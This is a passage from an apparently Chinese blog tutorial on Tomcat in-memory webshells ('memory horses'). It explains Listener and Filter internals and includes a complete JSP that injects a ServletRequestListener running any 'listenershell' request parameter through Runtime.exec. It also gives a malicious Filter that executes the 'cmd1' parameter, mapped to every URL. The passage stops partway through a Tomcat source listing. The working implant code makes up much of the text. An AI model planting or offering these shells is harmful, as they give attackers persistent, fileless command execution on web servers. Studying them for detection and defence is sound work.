class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> var10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    request<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"javax.servlet.error.exception\"</span><span class=\"token punctuation\">,</span> var10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>代码中获得Listener的方法也是调用了getApplicationEventListeners来获取，然后遍历数组，当是要调用的事件型监听器时，用listener.requestInitialized(event)将其触发。</p>\n<p>  现在知道Listener怎么存储了触发了，但我们还要知道如何添加Listener，这里说两种方案：</p>\n<p>  第一种，通过setApplicationEventListeners将Listener添加到数组中。</p>\n<p>  第二种，通过addApplicationEventListener方法来添加。</p>\n<p>  不管哪种方案，第一步肯定是获得StandardContext类，在上面的调用栈中可以看到调用了StandardHostValve的invoke方法，我们看下：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">void</span> <span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Request</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Response</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Context</span> context <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>那么我们也可以通过request来获取StandardContext。<br>获取后我们就分别说下添加Listener的两种方案：</p>\n<p>  第一种，通过getApplicationEventListeners获取的StandardContext中的Listener数组，并将添加我们创建的listener进去，再setApplicationEventListeners数组即可：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">   <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> objects <span class=\"token operator\">=</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">getApplicationEventListeners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">&gt;</span></span> listeners <span class=\"token operator\">=</span> <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">asList</span><span class=\"token punctuation\">(</span>objects<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">&gt;</span></span> listenershelllist <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">(</span>listeners<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">ListenerShell</span> listenershell <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ListenerShell</span><span class=\"token punctuation\">;</span>\n   listenershelllist<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>listenershell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   context<span class=\"token punctuation\">.</span><span class=\"token function\">setApplicationEventListeners</span><span class=\"token punctuation\">(</span>listenershelllist<span class=\"token punctuation\">.</span><span class=\"token function\">toArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  第二种，StandardContext中有addApplicationEventListener方法，可以直接添加Listener：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">ListenerShell</span> listenershell <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ListenerShell</span><span class=\"token punctuation\">;</span>\n   context<span class=\"token punctuation\">.</span><span class=\"token function\">addApplicationEventListener</span><span class=\"token punctuation\">(</span>listenershell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>附上第一种的完整代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page contentType<span class=\"token operator\">=</span><span class=\"token string\">\"text/html;charset=UTF-8\"</span> language<span class=\"token operator\">=</span><span class=\"token string\">\"java\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.lang.reflect.Field\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.io.IOException\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.core.StandardContext\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.connector.Request\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.io.InputStream\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.util.List\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.util.Arrays\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.util.ArrayList\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">ListenerMemShell</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ServletRequestListener</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token annotation punctuation\">@Override</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">requestInitialized</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestEvent</span> sre<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">HttpServletRequest</span> req <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span><span class=\"token punctuation\">)</span> sre<span class=\"token punctuation\">.</span><span class=\"token function\">getServletRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span> command <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"listenershell\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>command <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token class-name\">InputStream</span> in <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    n<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token annotation punctuation\">@Override</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">requestDestroyed</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestEvent</span> sre<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>\n    <span class=\"token class-name\">Field</span> reqF <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"request\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    reqF<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Request</span> req <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Request</span><span class=\"token punctuation\">)</span> reqF<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">StandardContext</span> context <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StandardContext</span><span class=\"token punctuation\">)</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> objects <span class=\"token operator\">=</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">getApplicationEventListeners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">&gt;</span></span> listeners <span class=\"token operator\">=</span> <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">asList</span><span class=\"token punctuation\">(</span>objects<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">&gt;</span></span> listenershelllist <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">(</span>listeners<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">ListenerMemShell</span> listenershell <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ListenerMemShell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    listenershelllist<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>listenershell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    context<span class=\"token punctuation\">.</span><span class=\"token function\">setApplicationEventListeners</span><span class=\"token punctuation\">(</span>listenershelllist<span class=\"token punctuation\">.</span><span class=\"token function\">toArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>访问jsp即注入成功后，任意路由?listenershell=command即可执行命令。</p>\n<h2 id=\"Filter内存马\"><a href=\"#Filter内存马\" class=\"headerlink\" title=\"Filter内存马\"></a>Filter内存马</h2><p>  创建一个恶意Filter，恶意代码写再doFilter里：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FilterShell</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Filter</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FilterConfig</span> filterConfig<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"filter初始化\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doFilter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">FilterChain</span> chain<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> command1 <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>command1 <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">InputStream</span> in <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>command1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                n<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        chain<span class=\"token punctuation\">.</span><span class=\"token function\">doFilter</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在web.xml里配置：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>filter<span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token operator\">&lt;</span>filter<span class=\"token operator\">-</span>name<span class=\"token operator\">&gt;</span><span class=\"token class-name\">FilterShell</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>filter<span class=\"token operator\">-</span>name<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>filter<span class=\"token operator\">-</span><span class=\"token keyword\">class</span><span class=\"token operator\">&gt;</span><span class=\"token class-name\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span></span>Filter<span class=\"token punctuation\">.</span>FilterShell</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>filter<span class=\"token operator\">-</span><span class=\"token keyword\">class</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>filter<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>filter<span class=\"token operator\">-</span>mapping<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>filter<span class=\"token operator\">-</span>name<span class=\"token operator\">&gt;</span><span class=\"token class-name\">FilterShell</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>filter<span class=\"token operator\">-</span>name<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>url<span class=\"token operator\">-</span>pattern<span class=\"token operator\">&gt;</span><span class=\"token comment\">/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n&lt;/web-app&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在正式调试之前，有几个类需要简单知道一下：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">FilterDef</span> 存储过滤器名filterName，过滤器实例filterClass，url 等基本信息\n<span class=\"token class-name\">FilterConfigs</span>存储当前上下文信息<span class=\"token class-name\">StandardContext</span>、<span class=\"token class-name\">FilterDef</span> 和 <span class=\"token class-name\">Filter</span>对象等信息\n<span class=\"token class-name\">FilterMaps</span> 中主要存放了 <span class=\"token class-name\">FilterName</span> 以及对应的<span class=\"token class-name\">URLPattern</span>\n<span class=\"token class-name\">FilterChain</span>：过滤器链，该对象上的 doFilter 方法能依次调用链上的 <span class=\"token class-name\">Filter</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>我们在doFilter处下断点，访问路由，查看调用栈：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">doFilter<span class=\"token operator\">:</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">FilterShell</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span></span>Filter</span><span class=\"token punctuation\">)</span>\ninternalDoFilter<span class=\"token operator\">:</span><span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ApplicationFilterChain</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\ndoFilter<span class=\"token operator\">:</span><span class=\"token number\">162</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ApplicationFilterChain</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\ninvoke<span class=\"token operator\">:</span><span class=\"token number\">197</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">StandardWrapperValve</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\ninvoke<span class=\"token operator\">:</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">StandardContextValve</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\ninvoke<span class=\"token operator\">:</span><span class=\"token number\">541</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuthenticatorBase</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>authenticator<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>我们看下ApplicationFilterChain：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">internalDoFilter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos <span class=\"token operator\">&lt;</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n         <span class=\"token class-name\">ApplicationFilterConfig</span> filterConfig <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>filters<span class=\"token punctuation\">[</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n         <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token class-name\">Filter</span> filter <span class=\"token operator\">=</span> filterConfig<span class=\"token punctuation\">.</span><span class=\"token function\">getFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">isAsyncSupported</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token string\">\"false\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">equalsIgnoreCase</span><span class=\"token punctuation\">(</span>filterConfig<span class=\"token punctuation\">.</span><span class=\"token function\">getFilterDef</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAsyncSupported</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                 request<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"org.apache.catalina.ASYNC_SUPPORTED\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Boolean</span><span class=\"token punctuation\">.</span>FALSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token punctuation\">}</span>\n\n             <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Globals</span><span class=\"token punctuation\">.</span>IS_SECURITY_ENABLED<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                 <span class=\"token class-name\">Principal</span> principal <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span><span class=\"token punctuation\">)</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getUserPrincipal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token class-name\">SecurityUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">doAsPrivilege</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"doFilter\"</span><span class=\"token punctuation\">,</span> filter<span class=\"token punctuation\">,</span> classType<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">,</span> principal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                 filter<span class=\"token punctuation\">.</span><span class=\"token function\">doFilter</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n             <span class=\"token punctuation\">}</span>\n\n         <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletException</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">RuntimeException</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">IOException</span> var15<span class=\"token punctuation\">)</span> <span class=\"token 